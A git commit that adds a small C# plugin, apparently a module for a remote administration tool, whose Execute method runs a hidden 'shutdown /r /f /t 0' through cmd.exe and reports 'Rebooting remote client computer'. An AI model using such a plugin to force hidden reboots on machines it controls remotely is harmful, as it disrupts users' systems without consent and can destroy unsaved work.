aaecd9ce97a98ad6b93195ee27ed3a168540e7b7
Byte Wizard <122925084+BYT3W1Z4RD@users.noreply.github.com>
2023-04-20 20:02:17 +0100

    Add files via upload

---
+++ Plugins /reboot/Class1.cs
@@ -0,0 +1,25 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Text;
+using Microsoft.Win32;
+
+namespace Plugin
+{
+    public class Plugin : MarshalByRefObject
+    {
+        public string Execute()
+        {
+            string response = "Rebooting remote client computer...";
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "cmd.exe";
+            psi.Arguments = "/c \"shutdown /r /f /t 0\"";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            Process myProcess = new Process();
+            myProcess.StartInfo = psi;
+            myProcess.Start();
+            myProcess.WaitForExit();
+            return response;
+        }
+    }
+}
